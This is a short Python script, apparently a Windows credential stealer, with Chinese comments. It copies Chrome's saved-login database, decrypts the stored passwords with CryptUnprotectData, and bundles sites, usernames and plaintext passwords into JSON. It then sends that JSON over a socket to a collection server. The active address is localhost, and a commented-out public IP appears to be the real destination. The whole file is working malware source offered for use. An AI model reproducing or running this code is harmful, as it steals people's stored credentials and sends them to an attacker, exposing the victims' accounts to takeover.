# -*- enconfig:utf8 -*-
import os,sys
import shutil
import sqlite3
from win32 import win32crypt
import socket
import traceback
import json

info = {
    'chrome':[],
    'status':'',
}
#socket客户端
def socket_client(user_pass_li):
    # 服务器地址
    # ip = '139.199.112.37'
    ip = '127.0.0.1'
    # 端口
    port = 9999
    client = socket.socket()
    client.connect((ip, port))
    client.send(user_pass_li.encode("utf8"))
    cmd_res = client.recv(1024)
    print(cmd_res.decode("utf8"))
    client.close()

#获取chrome用户密码
def get_chrome():
    try:
        user_pass_dic = { }
        db_file_path = os.path.join(os.environ['LOCALAPPDATA'],r'Google\Chrome\User Data\Default\Login Data')

        tmp_file = os.path.join(os.path.dirname(sys.executable),'tmp_tmp_tmp')
        if os.path.exists(tmp_file):
            os.remove(tmp_file)
        shutil.copyfile(db_file_path,tmp_file)

        conn = sqlite3.connect(tmp_file)
        for row in conn.execute('select signon_realm,username_value,password_value from logins'):
            try:
                ret = win32crypt.CryptUnprotectData(row[2],None,None,None,0)
                if row[1] != '':
                    user_pass_dic['url'] = row[0][:50]
                    user_pass_dic['user'] = row[1]
                    user_pass_dic['pass'] = ret[1].decode('gbk')
                    info['chrome'].append(user_pass_dic)
                    info['status'] = 'seccess'
                    user_pass_dic = { }
            except Exception as e:
                # print('获取Chrome密码失败...')
                info['status'] = 'false'
                raise e
        conn.close()
        os.remove(tmp_file)
    except Exception as e:
        info['status'] = 'false'
        repr(e)
    return info

if __name__ == '__main__':
    info = get_chrome()
    info = json.dumps(info)
    socket_client(info)




